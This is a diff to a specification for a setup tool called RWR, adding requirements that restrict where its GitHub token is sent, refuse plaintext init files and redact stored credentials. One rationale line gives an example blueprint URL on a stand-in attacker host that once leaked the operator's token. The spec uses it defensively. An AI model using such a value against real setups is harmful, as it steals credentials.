@@ -114,6 +114,65 @@ SHALL keep their setting.
 - **WHEN** `~/.config/rwr` exists at `0500`
 - **THEN** RWR leaves it at `0500`
 
+### Requirement: The GitHub token is sent only to GitHub
+
+RWR SHALL attach the configured GitHub token only to remotes whose host is
+`github.com`, `www.github.com`, or `raw.githubusercontent.com`. For any other
+`https://` host RWR SHALL clone anonymously and SHALL warn naming the host.
+
+RWR SHALL refuse an `http://` remote for a repository declared `private`, rather
+than sending the credential over it, and SHALL refuse any scheme other than
+`https://` or `git@` when authentication is requested.
+
+A blueprint's `url` is attacker-controlled input whenever the blueprint is. The
+token used to be attached to every non-SSH remote, so
+`{url: "http://attacker.tld/r.git", private: true}` mailed the operator's PAT to
+the attacker in cleartext.
+
+#### Scenario: A private repository on a third-party host
+
+- **WHEN** a blueprint declares a private repository at `https://git.example.com/x.git`
+- **THEN** RWR warns that the token is not being sent and clones without
+  authentication
+
+#### Scenario: A private repository over plaintext
+
+- **WHEN** a blueprint declares a private repository at `http://example.com/x.git`
+- **THEN** RWR refuses with an error naming the URL and sends no credential
+
+#### Scenario: A GitHub remote
+
+- **WHEN** a private repository at `https://github.com/owner/repo.git` is cloned
+- **THEN** the configured token is used as the HTTP credential
+
+### Requirement: The init file is never fetched over plaintext
+
+RWR SHALL refuse an init file given as an `http://` URL.
+
+The init file drives everything RWR then runs — which repository the blueprints
+come from, which package managers are installed, which scripts execute elevated.
+Over `http://` that document can be rewritten by anyone on the path.
+
+#### Scenario: An init file given over http
+
+- **WHEN** `--init-file http://example.com/init.yaml` is given
+- **THEN** RWR refuses with an error naming the URL and downloads nothing
+
+### Requirement: The interactive config creator does not echo stored credentials
+
+RWR SHALL show the current value redacted, rather than printing it as the prompt
+default, when `rwr config --create` asks for the GitHub token or the SSH private key.
+
+The prompt's purpose is to say whether a value is already stored, which a redaction
+placeholder answers just as well; printing the value writes a token and a private
+key onto the operator's terminal and into their scrollback.
+
+#### Scenario: Re-running the config creator
+
+- **WHEN** `rwr config --create` runs on a machine with a token already configured
+- **THEN** the prompt shows the redaction placeholder as the current value
+- **AND** pressing enter keeps the stored value
+
 ### Requirement: RWR does the credentialed work itself where it can
 
 Where RWR can perform a credentialed operation on the blueprint's behalf, it SHALL
